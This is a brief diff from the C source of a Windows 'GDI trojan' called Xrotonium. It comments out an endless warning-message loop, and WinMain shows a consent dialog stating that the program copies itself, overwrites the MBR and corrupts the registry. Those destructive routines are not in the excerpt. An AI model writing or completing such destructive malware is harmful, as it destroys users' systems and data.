@@ -5,11 +5,11 @@ void EndPayload(HANDLE hPayload) {
 	CloseHandle(hPayload);
 }
 
-DWORD WINAPI RepeatMsg(LPVOID pvoid) {
+/* DWORD WINAPI RepeatMsg(LPVOID pvoid) {
 	while (true) {
-		MessageBoxW(NULL, L"THE END IS COMING!!!", L"THE END IS COMING!!!", MB_ICONWARNING);
+		MessageBoxW(NULL, L"THE END IS COMING!!!", L"THE END IS COMING!!!", MB_ICONWARNING); // Thx to VenraTech for the message
 	}
-}
+} */
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow) {
 	if (MessageBoxW(NULL, L"Warning!\n\nYou are about to execute a malware called Xrotonium.exe (NotCCR\'s last Purgatorium remake) that will copy itself to system folders, overwrite the MBR, screw up text and corrupt the registry!\nNotCCR isn\'t responsible for any damage made by executing this software, reverse engineering it, or any subsequent artificial removal of this message box.\n\nIf you want to run this on a virtual machine, you may click \'Yes\' to proceed.\nHowever, if you are running on real hardware and your data is put at risk, then click \'No\' and remove this malware file quickly.\n\nAs said earlier, NotCCR, the creator of this trojan, is not responsible for any damages made using this malware.\nStill execute it?", L"GDI-Trojan.Win32.Xrotonium - Malware Warning", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) != IDYES) exit(0);
